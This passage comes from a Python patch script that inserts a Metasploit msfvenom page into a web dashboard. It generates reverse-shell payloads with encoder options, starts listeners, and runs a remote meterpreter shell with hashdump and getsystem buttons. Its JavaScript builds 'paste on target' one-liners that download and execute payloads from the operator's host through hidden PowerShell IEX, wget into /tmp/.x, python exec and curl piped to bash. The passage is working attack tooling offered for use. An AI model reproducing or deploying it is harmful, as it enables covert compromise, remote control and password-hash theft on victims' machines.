                <option value="php/meterpreter/reverse_tcp" data-format="raw" data-arch="" data-platform="php" data-proto="tcp">PHP Meterpreter/TCP</option>
                <option value="php/reverse_php" data-format="raw" data-arch="" data-platform="php" data-proto="tcp">PHP Reverse Shell</option>
                <option value="python/meterpreter/reverse_tcp" data-format="raw" data-arch="" data-platform="python" data-proto="tcp">Python Meterpreter/TCP</option>
                <option value="java/jsp_shell_reverse_tcp" data-format="jsp" data-arch="" data-platform="java" data-proto="tcp">JSP Shell/TCP</option>
                <option value="cmd/unix/reverse_bash" data-format="raw" data-arch="" data-platform="unix" data-proto="tcp">Unix Bash Reverse Shell</option>
                <option value="cmd/unix/reverse_python" data-format="raw" data-arch="" data-platform="unix" data-proto="tcp">Unix Python Reverse Shell</option>
              </optgroup>
              <optgroup label="macOS">
                <option value="osx/x64/meterpreter/reverse_tcp" data-format="macho" data-arch="x64" data-platform="osx" data-proto="tcp">macOS x64 Meterpreter/TCP</option>
                <option value="osx/x64/shell_reverse_tcp" data-format="macho" data-arch="x64" data-platform="osx" data-proto="tcp">macOS x64 Shell/TCP</option>
              </optgroup>
              <optgroup label="Android / iOS">
                <option value="android/meterpreter/reverse_tcp" data-format="apk" data-arch="" data-platform="android" data-proto="tcp">Android Meterpreter/TCP</option>
              </optgroup>
              <optgroup label="Custom">
                <option value="custom" data-format="" data-arch="" data-platform="" data-proto="">Custom (enter below)</option>
              </optgroup>
            </select>
          </div>
          <div class="fg" id="msf-custom-payload-row" style="display:none;margin-bottom:10px">
            <label>CUSTOM PAYLOAD</label>
            <input class="inp inp-mono" id="msfvenom-custom-payload" type="text" placeholder="windows/x64/meterpreter_reverse_https"/>
          </div>

          <!-- Auto-populated options -->
          <div class="row3" style="margin-bottom:12px">
            <div class="fg">
              <label>LHOST <span style="font-family:var(--mono);font-size:9px;color:var(--text3)" id="msf-ip-note">loading...</span></label>
              <div style="display:flex;gap:6px">
                <input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="Loading public IP..." style="flex:1"/>
                <button class="btn btn-outline btn-sm" onclick="msfLoadIP()" title="Refresh IPs">&#8635;</button>
              </div>
              <div id="msf-ip-selector" style="display:flex;gap:6px;margin-top:5px;flex-wrap:wrap"></div>
            </div>
            <div class="fg">
              <label>LPORT</label>
              <input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535"/>
            </div>
            <div class="fg">
              <label>FORMAT (-f) <span style="font-family:var(--mono);font-size:9px;color:var(--green)" id="msf-format-note">auto</span></label>
              <select class="inp inp-mono" id="msfvenom-format">
                <option value="exe">exe (Windows)</option>
                <option value="elf">elf (Linux)</option>
                <option value="macho">macho (macOS)</option>
                <option value="apk">apk (Android)</option>
                <option value="asp">asp</option><option value="aspx">aspx</option>
                <option value="php">php</option><option value="raw">raw/script</option>
                <option value="psh">psh (PowerShell)</option>
                <option value="jsp">jsp (Java)</option>
                <option value="jar">jar</option>
                <option value="py">py</option>
                <option value="rb">rb (Ruby)</option>
                <option value="powershell">powershell script</option>
              </select>
            </div>
          </div>

          <!-- Info panel showing auto-detected settings -->
          <div id="msf-auto-info" style="background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:var(--radius);padding:8px 12px;font-family:var(--mono);font-size:11px;color:var(--text2);margin-bottom:12px">
            <span style="color:var(--green)">&#9432;</span> Select a payload above to see auto-configuration
          </div>

          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>ENCODER (optional)</label>
              <select class="inp inp-mono" id="msfvenom-encoder">
                <option value="">None</option>
                <option value="x86/shikata_ga_nai">x86/shikata_ga_nai (best for x86)</option>
                <option value="x64/xor_dynamic">x64/xor_dynamic</option>
                <option value="x86/countdown">x86/countdown</option>
                <option value="x86/jmp_call_additive">x86/jmp_call_additive</option>
              </select>
            </div>
            <div class="fg"><label>ITERATIONS (-i)</label><input class="inp inp-mono" id="msfvenom-iterations" type="number" value="1" min="1" max="10"/></div>
            <div class="fg"><label>TIMEOUT (sec)</label><input class="inp inp-mono" id="msfvenom-timeout" type="number" value="60" min="10" max="300"/></div>
          </div>
          <div class="fg" style="margin-bottom:12px"><label>EXTRA OPTIONS</label><input class="inp inp-mono" id="msfvenom-extra" type="text" placeholder="EXITFUNC=thread PrependMigrate=true"/></div>

          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
            <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
            <button class="btn btn-outline btn-sm" onclick="msfStartHandler()">START HANDLER</button>
            <button class="btn btn-outline btn-sm" onclick="msfCopyOneliner()">COPY AGENT CMD</button>
          </div>

          <!-- One-liner agent command box -->
          <div id="msf-oneliner-box" style="display:none;margin-top:10px">
            <div class="fg"><label>ONE-LINER AGENT COMMAND (paste on target system)</label>
              <div style="display:flex;gap:6px">
                <input class="inp inp-mono" id="msf-oneliner" type="text" readonly style="flex:1;color:var(--green)"/>
                <button class="btn btn-primary btn-sm" onclick="copyMsfOneliner()">COPY</button>
              </div>
              <div style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:4px" id="msf-oneliner-note"></div>
            </div>
          </div>
        </div>
        <div class="progress-wrap" id="msfvenom-prog"><div class="progress-bar" id="msfvenom-pb" style="width:0%"></div></div>
        <div class="terminal" id="msfvenom-term"></div>
        <div class="err-box" id="msfvenom-err"></div>
        <div id="msfvenom-res"></div>
        </div><!-- end tab-gen -->

        <!-- TAB 2: Session Dashboard -->
        <div class="tc" id="msf-tab-sessions">
          <div class="card card-p" style="margin-bottom:12px">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
              <div>
                <div class="card-title">Active Sessions</div>
                <div style="font-size:11px;color:var(--text3);margin-top:2px">Connected target systems</div>
              </div>
              <div style="display:flex;gap:8px">
                <button class="btn btn-outline btn-sm" onclick="msfRefreshSessions()">&#8635; Refresh</button>
                <button class="btn btn-primary btn-sm" id="msf-handler-btn" onclick="msfStartHandler()">START HANDLER</button>
              </div>
            </div>
            <div id="msf-sessions-list">
              <div style="color:var(--text3);font-size:12px;padding:12px;text-align:center">
                &#9432; No active sessions. Generate a payload, start the handler, and wait for a connection.
              </div>
            </div>
          </div>
          <div class="card card-p">
            <div class="card-title" style="margin-bottom:8px">Handler Status</div>
            <div id="msf-handler-status" style="font-family:var(--mono);font-size:11px;color:var(--text3)">Not running</div>
            <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
              <div class="fg" style="margin:0;flex:1;min-width:120px"><label>PAYLOAD</label><input class="inp inp-mono" id="msf-h-payload" type="text" value="windows/x64/meterpreter/reverse_tcp"/></div>
              <div class="fg" style="margin:0;min-width:120px"><label>LHOST</label><input class="inp inp-mono" id="msf-h-lhost" type="text" placeholder="0.0.0.0"/></div>
              <div class="fg" style="margin:0;min-width:80px"><label>LPORT</label><input class="inp inp-mono" id="msf-h-lport" type="number" value="4444"/></div>
              <div style="display:flex;align-items:flex-end;gap:8px">
                <button class="btn btn-primary" onclick="msfStartHandler()">START</button>
              </div>
            </div>
          </div>
        </div>

        <!-- TAB 3: Remote Shell -->
        <div class="tc" id="msf-tab-shell">
          <div class="card card-p" style="margin-bottom:12px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;flex-wrap:wrap">
              <div class="fg" style="margin:0;flex:1;min-width:120px"><label>SESSION ID</label><input class="inp inp-mono" id="msf-shell-session" type="text" value="1" placeholder="1"/></div>
              <div style="display:flex;align-items:flex-end;gap:8px">
                <button class="btn btn-outline btn-sm" onclick="msfRefreshSessions()">LIST SESSIONS</button>
              </div>
            </div>
            <div id="msf-sessions-dropdown" style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px"></div>

            <!-- Shell terminal -->
            <div style="background:#0a0a0a;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden">
              <div style="padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between">
                <span style="font-family:var(--mono);font-size:10px;color:var(--text3)">REMOTE SHELL — Session <span id="msf-active-session-label">1</span></span>
                <div style="display:flex;gap:6px">
                  <button class="btn btn-ghost btn-sm" onclick="msfShellClear()">CLR</button>
                  <button class="btn btn-ghost btn-sm" onclick="msfShellScroll()">&#8595;</button>
                </div>
              </div>
              <div id="msf-shell-output"
                   style="background:#0a0a0a;color:#00e5ff;font-family:var(--mono);font-size:12px;
                          line-height:1.7;padding:12px;min-height:280px;max-height:450px;
                          overflow-y:auto;white-space:pre-wrap;word-break:break-all">
                <span style="color:var(--text3)">[*] Select a session and send a command below</span>
              </div>
              <div style="display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--bg2)">
                <span style="font-family:var(--mono);font-size:12px;color:var(--text3);flex-shrink:0" id="msf-shell-prompt">meterpreter &gt;</span>
                <input id="msf-shell-input" class="inp inp-mono"
                       type="text"
                       placeholder="whoami, sysinfo, getuid, shell, ifconfig..."
                       style="flex:1;background:transparent;border:none;box-shadow:none;padding:4px 0;font-size:12px;color:var(--green)"
                       onkeydown="msfShellKey(event)"
                       autocomplete="off" spellcheck="false"/>
                <button class="btn btn-primary btn-sm" onclick="msfShellSend()">SEND</button>
              </div>
            </div>

            <!-- Quick commands -->
            <div style="margin-top:10px">
              <div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:6px">QUICK COMMANDS</div>
              <div style="display:flex;flex-wrap:wrap;gap:5px">
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('sysinfo')" style="font-family:var(--mono);font-size:10px">sysinfo</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('getuid')" style="font-family:var(--mono);font-size:10px">getuid</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('whoami')" style="font-family:var(--mono);font-size:10px">whoami</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('ifconfig')" style="font-family:var(--mono);font-size:10px">ifconfig</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('ipconfig')" style="font-family:var(--mono);font-size:10px">ipconfig</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('pwd')" style="font-family:var(--mono);font-size:10px">pwd</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('ls')" style="font-family:var(--mono);font-size:10px">ls</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('ps')" style="font-family:var(--mono);font-size:10px">ps</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('getpid')" style="font-family:var(--mono);font-size:10px">getpid</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('getsystem')" style="font-family:var(--mono);font-size:10px">getsystem</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('hashdump')" style="font-family:var(--mono);font-size:10px">hashdump</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('shell')" style="font-family:var(--mono);font-size:10px">shell</button>
                <button class="btn btn-outline btn-sm" onclick="msfQuickCmd('background')" style="font-family:var(--mono);font-size:10px">background</button>
              </div>
            </div>
          </div>
        </div>
      </div>'''

patch_file(SERVER, "msfvenom: full new page with sessions/shell", OLD_MSFVENOM_PAGE, NEW_MSFVENOM_PAGE)

# Add JS for msfvenom features (replace old runMsfvenom)
OLD_MSF_JS = '''/* msfvenom */
async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var args='-p '+payload;
  if(lhost)args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format;
  if(encoder)args+=' -e '+encoder+' -i '+iterations;
  if(extra)args+=' '+extra;
  args+=' --platform auto';
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{t.log('Payload generated (exit '+d.exit_code+')','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>');}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}'''

NEW_MSF_JS = '''/* ══ MSFVENOM COMPLETE ═════════════════════════════════════════ */
var _msfPublicIP='';
var _msfShellHistory=[];
var _msfShellHistIdx=-1;
var _msfSessions=[];

// Payload → auto-settings map
var MSF_PAYLOAD_MAP={
  'windows/x64/meterpreter/reverse_tcp':  {format:'exe',arch:'x64',platform:'windows',ext:'exe',proto:'tcp'},
  'windows/x64/meterpreter_reverse_tcp':  {format:'exe',arch:'x64',platform:'windows',ext:'exe',proto:'tcp'},
  'windows/x64/meterpreter/reverse_https':{format:'exe',arch:'x64',platform:'windows',ext:'exe',proto:'https'},
  'windows/x64/shell_reverse_tcp':         {format:'exe',arch:'x64',platform:'windows',ext:'exe',proto:'tcp'},
  'windows/x64/powershell_reverse_tcp':   {format:'psh',arch:'x64',platform:'windows',ext:'ps1',proto:'tcp'},
  'windows/meterpreter/reverse_tcp':       {format:'exe',arch:'x86',platform:'windows',ext:'exe',proto:'tcp'},
  'windows/meterpreter_reverse_tcp':       {format:'exe',arch:'x86',platform:'windows',ext:'exe',proto:'tcp'},
  'windows/shell_reverse_tcp':             {format:'exe',arch:'x86',platform:'windows',ext:'exe',proto:'tcp'},
  'linux/x64/meterpreter/reverse_tcp':    {format:'elf',arch:'x64',platform:'linux',  ext:'elf',proto:'tcp'},
  'linux/x64/meterpreter_reverse_tcp':    {format:'elf',arch:'x64',platform:'linux',  ext:'elf',proto:'tcp'},
  'linux/x64/shell_reverse_tcp':           {format:'elf',arch:'x64',platform:'linux',  ext:'elf',proto:'tcp'},
  'linux/x86/shell_reverse_tcp':           {format:'elf',arch:'x86',platform:'linux',  ext:'elf',proto:'tcp'},
  'php/meterpreter/reverse_tcp':           {format:'raw',arch:'',   platform:'php',    ext:'php',proto:'tcp'},
  'php/reverse_php':                       {format:'raw',arch:'',   platform:'php',    ext:'php',proto:'tcp'},
  'python/meterpreter/reverse_tcp':        {format:'raw',arch:'',   platform:'python', ext:'py', proto:'tcp'},
  'java/jsp_shell_reverse_tcp':            {format:'jsp',arch:'',   platform:'java',   ext:'jsp',proto:'tcp'},
  'cmd/unix/reverse_bash':                 {format:'raw',arch:'',   platform:'unix',   ext:'sh', proto:'tcp'},
  'cmd/unix/reverse_python':               {format:'raw',arch:'',   platform:'unix',   ext:'py', proto:'tcp'},
  'osx/x64/meterpreter/reverse_tcp':      {format:'macho',arch:'x64',platform:'osx',  ext:'',   proto:'tcp'},
  'osx/x64/shell_reverse_tcp':             {format:'macho',arch:'x64',platform:'osx',  ext:'',   proto:'tcp'},
  'android/meterpreter/reverse_tcp':       {format:'apk', arch:'',   platform:'android',ext:'apk',proto:'tcp'},
};

async function msfLoadIP(){
  try{
    var r=await fetch('/api/public-ip');
    var d=await r.json();
    _msfPublicIP=d.public||d.configured||'';
    var lhostEl=document.getElementById('msfvenom-lhost');
    if(lhostEl&&!lhostEl.value) lhostEl.value=_msfPublicIP;
    // Build IP selector
    var sel=document.getElementById('msf-ip-selector');
    if(sel){
      sel.innerHTML='';
      var ips={};
      if(d.public) ips['Public: '+d.public]=d.public;
      if(d.local) ips['Local: '+d.local]=d.local;
      if(d.configured) ips['Server: '+d.configured]=d.configured;
      Object.entries(ips).forEach(function(kv){
        var btn=document.createElement('button');
        btn.className='btn btn-outline btn-sm';
        btn.style.fontFamily='var(--mono)';btn.style.fontSize='10px';
        btn.textContent=kv[0];
        btn.onclick=function(){
          document.getElementById('msfvenom-lhost').value=kv[1];
          document.getElementById('msf-h-lhost').value=kv[1];
          msfUpdateOneliner();
        };
        sel.appendChild(btn);
      });
    }
    var note=document.getElementById('msf-ip-note');
    if(note) note.textContent='(public: '+(_msfPublicIP||'?')+')';
    // Also set handler IP
    var hLhost=document.getElementById('msf-h-lhost');
    if(hLhost&&!hLhost.value) hLhost.value=_msfPublicIP||'0.0.0.0';
  }catch(e){
    var note=document.getElementById('msf-ip-note');
    if(note) note.textContent='(could not detect)';
  }
}

function msfPayloadChanged(){
  var sel=document.getElementById('msfvenom-payload');
  var val=sel?sel.value:'';
  var info=MSF_PAYLOAD_MAP[val];
  var customRow=document.getElementById('msf-custom-payload-row');
  if(val==='custom'){
    if(customRow) customRow.style.display='block';
    return;
  }
  if(customRow) customRow.style.display='none';
  if(!info) return;
  // Auto-set format
  var fmtEl=document.getElementById('msfvenom-format');
  if(fmtEl) fmtEl.value=info.format;
  var fmtNote=document.getElementById('msf-format-note');
  if(fmtNote) fmtNote.textContent='auto → '+info.format;
  // Auto-set encoder recommendation
  var encEl=document.getElementById('msfvenom-encoder');
  if(encEl&&info.arch==='x86'&&encEl.value==='') encEl.value='x86/shikata_ga_nai';
  // Update info panel
  var infoEl=document.getElementById('msf-auto-info');
  if(infoEl){
    infoEl.innerHTML='<span style="color:var(--green)">&#10003;</span> '
      +'<strong>'+val+'</strong>'
      +' &nbsp;|&nbsp; Format: <span style="color:var(--cyan)">'+info.format+'</span>'
      +' &nbsp;|&nbsp; Arch: <span style="color:var(--cyan)">'+(info.arch||'any')+'</span>'
      +' &nbsp;|&nbsp; Platform: <span style="color:var(--cyan)">'+info.platform+'</span>'
      +' &nbsp;|&nbsp; Proto: <span style="color:var(--cyan)">'+info.proto+'</span>';
  }
  // Update handler payload
  var hPayload=document.getElementById('msf-h-payload');
  if(hPayload) hPayload.value=val;
  msfUpdateOneliner();
}

function msfUpdateOneliner(){
  var payload=document.getElementById('msfvenom-payload');
  var val=payload?payload.value:'';
  if(val==='custom') val=document.getElementById('msfvenom-custom-payload').value.trim();
  var lhost=document.getElementById('msfvenom-lhost').value.trim()||_msfPublicIP||'YOUR_IP';
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var info=MSF_PAYLOAD_MAP[val]||{format:'exe',ext:'exe',platform:'windows'};
  var box=document.getElementById('msf-oneliner-box');
  var inpEl=document.getElementById('msf-oneliner');
  var noteEl=document.getElementById('msf-oneliner-note');
  if(!box||!inpEl) return;
  var cmd='';var note='';
  var platform=info.platform||'';
  var serverUrl='http://'+lhost;
  // Generate platform-specific download+execute one-liner
  if(platform==='windows'){
    var fname='payload.'+info.ext;
    cmd='powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(\''+serverUrl+':8080/serve/'+fname+'\');Invoke-Expression(\'./'+fname+'\')"';
    note='Windows PowerShell download-and-execute. Serve payload at '+serverUrl+':8080/serve/'+fname;
  }else if(platform==='linux'){
    var lname='payload.elf';
    cmd='wget -q '+serverUrl+':8080/serve/'+lname+' -O /tmp/.x;chmod +x /tmp/.x;/tmp/.x &';
    note='Linux wget one-liner. Serve payload at '+serverUrl+':8080/serve/'+lname;
  }else if(platform==='php'){
    cmd='php -r "eval(base64_decode(\''.concat('...','\'));";');
    note='Upload payload.php to target web server, then access via browser or curl';
  }else if(platform==='python'){
    cmd='python3 -c "import urllib.request;exec(urllib.request.urlopen(\''+serverUrl+':8080/serve/payload.py\').read())"';
    note='Python download+exec. Serve payload at '+serverUrl+':8080/serve/payload.py';
  }else if(platform==='unix'){
    cmd='curl -s '+serverUrl+':8080/serve/payload.sh | bash';
    note='Unix bash one-liner. Serve payload at '+serverUrl+':8080/serve/payload.sh';
  }else if(platform==='android'){
    cmd='adb install payload.apk';
    note='Transfer payload.apk to Android device and install';
  }else{
    cmd='# Transfer payload to target and execute';
    note='No automatic one-liner for this payload type';
  }
  inpEl.value=cmd;
  if(noteEl) noteEl.textContent=note;
  box.style.display='block';
}

function msfCopyOneliner(){msfUpdateOneliner();}
function copyMsfOneliner(){
  var el=document.getElementById('msf-oneliner');
  if(el){
    navigator.clipboard.writeText(el.value).then(function(){
      showToast('Copied','One-liner command copied to clipboard','success',2500);
    });
  }
}

function msfTab(e,id){
  document.querySelectorAll('#page-msfvenom .tab').forEach(function(t){t.classList.remove('active');});
  document.querySelectorAll('#page-msfvenom .tc').forEach(function(t){t.classList.remove('active');});
  e.currentTarget.classList.add('active');
  var tc=document.getElementById(id);if(tc)tc.classList.add('active');
  if(id==='msf-tab-sessions') msfRefreshSessions();
}

async function msfRefreshSessions(){
  var listEl=document.getElementById('msf-sessions-list');
  var dropEl=document.getElementById('msf-sessions-dropdown');
  var statusEl=document.getElementById('msf-handler-status');
  try{
    var r=await fetch('/api/msf/sessions');
    var d=await r.json();
    _msfSessions=d.sessions||[];
    if(statusEl){
      statusEl.innerHTML=d.handler_running
        ?'<span style="color:var(--green)">&#9679; Handler running</span>'
        :'<span style="color:var(--text3)">&#9675; Handler not running</span>';
    }
    if(!_msfSessions.length){
      if(listEl) listEl.innerHTML='<div style="color:var(--text3);font-size:12px;padding:12px;text-align:center">&#9432; No active sessions.'+(d.handler_running?' Handler is listening — waiting for connection.':' Start handler first.')+'</div>';
      if(dropEl) dropEl.innerHTML='';
      return;
    }
    var html='<div class="tbl-wrap"><table class="tbl"><thead><tr><th>ID</th><th>TYPE</th><th>HOST</th><th>USER</th><th>OS</th><th></th></tr></thead><tbody>';
    _msfSessions.forEach(function(s){
      html+='<tr><td style="font-family:var(--mono);color:var(--cyan)">#'+s.id+'</td>'
        +'<td><span class="tag">'+s.type+'</span></td>'
        +'<td style="font-family:var(--mono);font-size:11px">'+(s.tunnel_peer||s.info||'?')+'</td>'
        +'<td style="font-family:var(--mono);font-size:11px">'+(s.username||'?')+'</td>'
        +'<td style="font-size:11px;color:var(--text3)">'+(s.platform||'?')+'</td>'
        +'<td><button class="btn btn-primary btn-sm" onclick="msfSelectSession(\''+s.id+'\')">EXPLOIT</button></td></tr>';
    });
    html+='</tbody></table></div>';
    if(listEl) listEl.innerHTML=html;
    // Update dropdown in shell tab
    if(dropEl){
      dropEl.innerHTML='';
      _msfSessions.forEach(function(s){
        var btn=document.createElement('button');
        btn.className='btn btn-outline btn-sm';
        btn.style.fontFamily='var(--mono)';btn.style.fontSize='10px';
        btn.textContent='Session #'+s.id+' — '+(s.tunnel_peer||s.info||'?');
        btn.onclick=function(){msfSelectSession(s.id);};
        dropEl.appendChild(btn);
      });
    }
  }catch(e){
    if(listEl) listEl.innerHTML='<div style="color:var(--red)">Error: '+e.message+'</div>';
  }
}

function msfSelectSession(id){
  // Switch to shell tab
  document.querySelectorAll('#page-msfvenom .tab')[2].click();
  document.getElementById('msf-shell-session').value=id;
  document.getElementById('msf-active-session-label').textContent=id;
  var out=document.getElementById('msf-shell-output');
  if(out){out.textContent='[*] Session #'+id+' selected. Type a command below.\n';}
  document.getElementById('msf-shell-input').focus();
  showToast('Session #'+id+' selected','Type commands in the shell below','success',2500);
}

async function msfStartHandler(){
  var payload=document.getElementById('msf-h-payload').value.trim()||
               document.getElementById('msfvenom-payload').value;
  var lhost=document.getElementById('msf-h-lhost').value.trim()||
             document.getElementById('msfvenom-lhost').value.trim()||'0.0.0.0';
  var lport=document.getElementById('msf-h-lport').value||
             document.getElementById('msfvenom-lport').value||'4444';
  try{
    var r=await fetch('/api/msf/handler',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({payload:payload,lhost:lhost,lport:lport})});
    var d=await r.json();
    if(d.error){showToast('Handler Error',d.error,'error',5000);}
    else{
      showToast('Handler Started','PID: '+d.pid+' — '+d.message,'success',5000);
      var statusEl=document.getElementById('msf-handler-status');
      if(statusEl) statusEl.innerHTML='<span style="color:var(--green)">&#9679; Handler started — PID '+d.pid+' — listening on '+lhost+':'+lport+'</span>';
    }
  }catch(e){showToast('Error',e.message,'error',4000);}
}

async function msfShellSend(){
  var session=document.getElementById('msf-shell-session').value.trim()||'1';
  var inp=document.getElementById('msf-shell-input');
  var cmd=(inp?inp.value.trim():'');
  if(!cmd) return;
  if(inp) inp.value='';
  _msfShellHistory.unshift(cmd);
  if(_msfShellHistory.length>50) _msfShellHistory.pop();
  _msfShellHistIdx=-1;
  var out=document.getElementById('msf-shell-output');
  if(out) out.textContent+='\\nmsf > '+cmd+'\\n';
  try{
    var r=await fetch('/api/msf/shell',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({session_id:session,cmd:cmd})});
    var d=await r.json();
    if(out){
      out.textContent+=(d.output||d.error||'(no output)')+'\\n';
      out.scrollTop=out.scrollHeight;
    }
  }catch(e){
    if(out){out.textContent+='[Error] '+e.message+'\\n';out.scrollTop=out.scrollHeight;}
  }
}
function msfShellKey(e){
  var inp=document.getElementById('msf-shell-input');
  if(e.key==='Enter'){e.preventDefault();msfShellSend();}
  else if(e.key==='ArrowUp'){e.preventDefault();if(_msfShellHistIdx<_msfShellHistory.length-1){_msfShellHistIdx++;inp.value=_msfShellHistory[_msfShellHistIdx]||'';}}
  else if(e.key==='ArrowDown'){e.preventDefault();if(_msfShellHistIdx>0){_msfShellHistIdx--;inp.value=_msfShellHistory[_msfShellHistIdx]||'';}else{_msfShellHistIdx=-1;inp.value='';}}
}
function msfShellClear(){var o=document.getElementById('msf-shell-output');if(o)o.textContent='';}
function msfShellScroll(){var o=document.getElementById('msf-shell-output');if(o)o.scrollTop=o.scrollHeight;}
function msfQuickCmd(c){document.getElementById('msf-shell-input').value=c;msfShellSend();}

async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var info=MSF_PAYLOAD_MAP[payload]||{};
  // Build output filename
  var ext=info.ext||format;
  var outFile='/tmp/vulnscan_payload_'+Date.now()+'.'+(ext||format);
  var args='-p '+payload;
  if(lhost) args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format+' -o '+outFile;
  if(encoder) args+=' -e '+encoder+' -i '+iterations;
  if(extra) args+=' '+extra;
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');t.log('LHOST='+lhost+' LPORT='+lport+' Format='+format,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},
      Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      t.log('Payload generated (exit '+d.exit_code+')','s');
      msfUpdateOneliner();
      var resHtml='<div class="card card-p">';
      resHtml+='<div class="card-title" style="margin-bottom:8px">Payload Generated</div>';
      resHtml+='<div class="stats" style="margin-bottom:12px">'
        +'<div class="stat"><div class="stat-val" style="font-size:14px">'+payload.split('/').pop()+'</div><div class="stat-lbl">PAYLOAD</div></div>'
        +'<div class="stat"><div class="stat-val" style="font-size:14px;color:var(--cyan)">'+lhost+'</div><div class="stat-lbl">LHOST</div></div>'
        +'<div class="stat"><div class="stat-val" style="font-size:14px">'+lport+'</div><div class="stat-lbl">LPORT</div></div>'
        +'<div class="stat"><div class="stat-val" style="font-size:14px">'+format.toUpperCase()+'</div><div class="stat-lbl">FORMAT</div></div>'
        +'</div>';
      resHtml+='<div style="margin-bottom:10px"><div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:5px">GENERATED FILE</div>'
        +'<div style="font-family:var(--mono);font-size:11px;color:var(--green)">'+outFile+'</div></div>';
      // One-liner
      var oneliner=document.getElementById('msf-oneliner');
      if(oneliner&&oneliner.value){
        resHtml+='<div style="margin-bottom:10px"><div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:5px">AGENT COMMAND (paste on target)</div>'
          +'<div style="display:flex;gap:6px">'
          +'<input type="text" class="inp inp-mono" value="'+oneliner.value.replace(/"/g,"&quot;")+'" readonly style="flex:1;color:var(--green);font-size:11px"/>'
          +'<button class="btn btn-primary btn-sm" onclick="copyMsfOneliner()">COPY</button>'
          +'</div></div>';
      }
      resHtml+='<div style="margin-top:8px"><button class="btn btn-outline btn-sm" onclick="msfStartHandler()">START HANDLER NOW</button></div>';
      resHtml+='<div class="card-p" style="margin-top:10px;border-top:1px solid var(--border)"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>';
      resHtml+='</div>';
      t.res(resHtml);
    }
  }catch(e){t.end();t.err(e.message);}
